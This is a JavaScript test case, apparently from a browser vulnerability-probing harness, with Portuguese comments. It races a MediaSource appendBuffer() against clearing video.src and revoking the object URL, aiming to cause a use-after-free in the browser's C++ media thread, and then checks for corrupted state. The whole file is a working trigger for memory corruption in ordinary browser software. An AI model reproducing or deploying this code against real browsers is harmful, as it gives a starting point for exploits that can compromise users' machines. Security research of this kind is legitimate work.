export default {
    id:       'MEDIASOURCE_SRC_CLEAR_UAF',
    category: 'Media',
    risk:     'CRITICAL',
    description:
        'Race Condition contra a Thread de Media C++. Inicia um appendBuffer() (assíncrono ' +
        'na background thread) e, sem esperar que termine, revoga o objeto e limpa o video.src. ' +
        'A thread em background pode escrever os dados multimédia em memória C++ libertada.',
    supported: () => typeof MediaSource !== 'undefined',

    setup: async function() {
        this.ms = new MediaSource();
        this.video = document.createElement('video');
        this.url = URL.createObjectURL(this.ms);
        this.video.src = this.url;
        this.results = {};

        // Esperamos o MS abrir para injetar o SourceBuffer
        await new Promise(resolve => {
            this.ms.addEventListener('sourceopen', resolve, {once: true});
        });

        // Criamos o canal de decodificação
        try {
            this.sb = this.ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"');
        } catch(e) {
            this.sb = this.ms.addSourceBuffer('video/webm; codecs="vp8"'); // Fallback
        }

        // Criamos um buffer válido mínimo para iniciar a thread C++
        this.fakeVideoData = new Uint8Array([0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70]); 
    },

    trigger: function() {
        try {
            // 1. INICIA A ESCRITA (Vai para a Background Thread)
            this.sb.appendBuffer(this.fakeVideoData);

            // 2. O GATILHO DA CORRIDA: Destrói tudo na Main Thread imediatamente!
            this.video.src = '';
            URL.revokeObjectURL(this.url);
            
            // Força a libertação dos wrappers
            this.ms = null;
            this.sb = null;
        } catch(e) {
            this.results.error = e.constructor.name;
        }
    },

    probe: [
        // Probe 0: O C++ sobreviveu à corrida sem abortar?
        s => s.results.error || 'Corrida de Threads Lançada',
        
        // Probe 1: O Motor de Media do vídeo ficou corrompido?
        s => {
            try {
                let err = s.video.error;
                let state = s.video.networkState;
                if (state === 3) return 'Network_No_Source (Seguro)';
                return `Estado Anómalo: ${state} / Erro: ${err ? err.code : 'null'}`;
            } catch(e) {
                return `Crash do Video Wrapper: ${e.message}`;
            }
        }
    ],

    cleanup: function() {
        try { this.video.remove(); } catch(e) {}
        this.video = null;
        this.fakeVideoData = null;
    }
};
